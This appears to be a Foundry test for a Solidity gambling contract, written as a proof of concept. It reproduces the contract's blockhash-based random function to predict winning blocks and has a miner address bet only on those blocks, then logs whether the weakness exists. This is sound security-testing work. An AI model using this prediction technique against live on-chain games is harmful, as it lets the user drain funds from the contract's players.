// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/random_number_generator.sol";

contract MinerManipulationTest is Test {
    RandomNumberGenerator game;
    address miner = address(0x456);
    uint256 constant SALT_SLOT = 0; // Assume salt is stored at slot 0
    uint256 constant SALT_VALUE = 42; // Safe non-zero salt value (mod 5 ≠ 0)

    function setUp() public {
        // Start beyond block 256 to have valid blockhash references
        uint256 initialBlockNumber = 500;
        vm.roll(initialBlockNumber);
        
        // Deploy contract and force-set the salt to known value
        game = new RandomNumberGenerator();
        vm.store(address(game), bytes32(SALT_SLOT), bytes32(SALT_VALUE));
    }

    // Replicates the contract's exact random function logic
    function predictOutcome(uint256 blockNum, uint256 salt) private view returns (uint256 result) {
        uint256 max = 100;
        unchecked {
            uint256 x = salt * 100 / max;
            uint256 divisor = salt % 5;
            uint256 y = salt * blockNum / divisor;
            uint256 seed = blockNum / 3 + (salt % 300) + y;
            // Blockhash only works for last 256 blocks
            uint256 h = uint256(blockhash(seed));
            return uint256((h / x)) % max + 1;
        }
    }

    function testMinerWinsByManipulatingBlocks() public {
        vm.roll(500); // Ensure known block
        uint256 startBlock = block.number + 1;
        uint256 wins;
        uint256 blocks = 100;

        // Record state BEFORE manipulation
        console.log("--- BEFORE-Trigger ---");
        uint256 beforeWins;
        uint256 beforeTotalGames = game.totalGames();
        (, beforeWins) = game.getPlayerStats(miner);
        console.log("Miner initial wins:", beforeWins);
        console.log("Total initial games:", beforeTotalGames);
        
        for (uint256 blockNum = startBlock; blockNum < startBlock + blocks; blockNum++) {
            // Predict outcome for this upcoming block
            uint256 prediction = predictOutcome(blockNum, SALT_VALUE);
            bool willWin = (prediction % 10 == 0);
            
            // Move chain to next block
            vm.roll(blockNum);
            
            if (willWin) {
                // Miner plays only when they know they'll win
                vm.prank(miner);
                game.playGame(1 wei); // Small bet
                wins++;
            }
        }
        
        // Record state AFTER manipulation
        console.log("--- AFTER-Trigger ---");
        uint256 afterTotalGames = game.totalGames();
        uint256 afterWins;
        (, afterWins) = game.getPlayerStats(miner);
        console.log("Miner wins after attack:", afterWins);
        console.log("Total games after attack:", afterTotalGames);

        // Calculate differentials
        uint256 actualWinIncrease = afterWins - beforeWins;
        uint256 actualGameIncrease = afterTotalGames - beforeTotalGames;
        console.log("Attack attempts (predicted wins):", wins);
        console.log("Actual win increase:", actualWinIncrease);
        console.log("Actual game increase:", actualGameIncrease);

        // Get final win count for original assertion
        (, uint256 minerWins) = game.getPlayerStats(miner);
        assertGe(minerWins, wins, "Miner should win when predicted");

        // Final vulnerability verdict
        if (actualWinIncrease == wins && wins > 0 && actualGameIncrease == wins) {
            console.log("Vulnerability Exists: Miner successfully won exactly as predicted with matching game increases");
        } else {
            console.log("Vulnerability not Exist: Win/game increase (%s/%s) does not match predictions (%s)", actualWinIncrease, actualGameIncrease, wins);
        }
    }
}